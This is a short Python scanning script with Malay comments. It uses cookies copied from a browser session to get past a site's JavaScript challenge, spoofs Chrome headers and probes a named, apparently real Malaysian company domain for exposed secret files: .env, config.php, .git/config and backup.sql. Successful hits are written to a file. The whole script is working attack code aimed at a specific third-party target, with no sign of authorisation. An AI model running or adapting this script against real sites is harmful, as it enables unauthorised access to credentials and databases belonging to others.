import requests
import json
import os

def load_session():
    # Kita load cookie yang kau dah copy-paste dari Kiwi tadi
    if os.path.exists('session.json'):
        with open('session.json', 'r') as f:
            return json.load(f)
    return {}

def scan_target(url, path):
    cookies = load_session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    }
    
    full_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
    print(f"[*] Testing: {full_url}")
    
    try:
        # Guna session cookies yang dah lepas JS Challenge
        r = requests.get(full_url, headers=headers, cookies=cookies, timeout=10)
        if r.status_code == 200:
            print(f"[!] POTENTIAL HIT: {full_url} (Size: {len(r.text)})")
            # Simpan result kalau jumpa
            with open('hits.txt', 'a') as f:
                f.write(f"{full_url}\n")
        else:
            print(f"[-] Status: {r.status_code}")
    except Exception as e:
        print(f"[x] Error: {str(e)}")

# Contoh guna
target = "https://universaljaecoo.umgroup.com.my"
paths = [".env", "config.php", ".git/config", "backup.sql"]

for p in paths:
    scan_target(target, p)
